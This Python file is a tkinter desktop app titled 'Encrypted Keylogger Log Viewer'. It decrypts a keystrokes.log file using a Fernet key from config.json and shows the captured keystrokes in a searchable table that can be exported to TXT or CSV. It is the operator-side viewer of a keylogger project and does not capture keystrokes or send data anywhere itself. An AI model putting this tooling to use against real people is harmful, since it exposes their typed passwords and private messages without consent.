import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from encrypt_util import load_key, decrypt_data
import json, os, csv

config_path = os.path.join(os.path.dirname(__file__), 'config.json')
with open(config_path) as f:
    config = json.load(f)

fernet = load_key(config["encryption_key"])
log_path = os.path.join(os.path.dirname(__file__), "logs", "keystrokes.log")

def read_and_decrypt_logs():
    logs = []
    try:
        with open(log_path, "r") as f:
            for line in f:
                try:
                    timestamp_part = line.split(']')[0][1:]
                    encrypted_part = line.split(']')[1].strip()
                    decrypted = decrypt_data(fernet, encrypted_part)
                    logs.append((timestamp_part, decrypted))
                except Exception as e:
                    logs.append(("Error", f"Could not decrypt: {line.strip()}"))
    except FileNotFoundError:
        logs.append(("N/A", "Log file not found."))
    return logs

class LogViewerApp:
    def __init__(self, root):
        self.root = root
        root.title("Encrypted Keylogger Log Viewer")
        root.geometry("700x500")

        frame = tk.Frame(root)
        frame.pack(fill="both", expand=True, padx=10, pady=10)

        self.search_var = tk.StringVar()
        search_frame = tk.Frame(frame)
        search_frame.pack(fill="x")
        tk.Label(search_frame, text="Search:").pack(side="left")
        search_entry = tk.Entry(search_frame, textvariable=self.search_var)
        search_entry.pack(side="left", fill="x", expand=True)
        search_entry.bind("<KeyRelease>", self.update_display)

        self.tree = ttk.Treeview(frame, columns=("Timestamp", "Keystroke"), show='headings')
        self.tree.heading("Timestamp", text="Timestamp")
        self.tree.heading("Keystroke", text="Keystroke")
        self.tree.pack(fill="both", expand=True)

        btn_frame = tk.Frame(frame)
        btn_frame.pack(pady=10)
        tk.Button(btn_frame, text="Reload Logs", command=self.load_logs).pack(side="left", padx=5)
        tk.Button(btn_frame, text="Export as TXT", command=self.export_txt).pack(side="left", padx=5)
        tk.Button(btn_frame, text="Export as CSV", command=self.export_csv).pack(side="left", padx=5)

        self.all_logs = []
        self.load_logs()

    def load_logs(self):
        self.all_logs = read_and_decrypt_logs()
        self.update_display()

    def update_display(self, *args):
        query = self.search_var.get().lower()
        self.tree.delete(*self.tree.get_children())
        for ts, key in self.all_logs:
            if query in key.lower():
                self.tree.insert("", "end", values=(ts, key))

    def export_txt(self):
        path = filedialog.asksaveasfilename(defaultextension=".txt")
        if not path: return
        try:
            with open(path, "w") as f:
                for ts, key in self.all_logs:
                    f.write(f"[{ts}] {key}\n")
            messagebox.showinfo("Success", f"Logs exported to {path}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to export: {e}")

    def export_csv(self):
        path = filedialog.asksaveasfilename(defaultextension=".csv")
        if not path: return
        try:
            with open(path, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["Timestamp", "Keystroke"])
                writer.writerows(self.all_logs)
            messagebox.showinfo("Success", f"CSV exported to {path}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to export: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = LogViewerApp(root)
    root.mainloop()
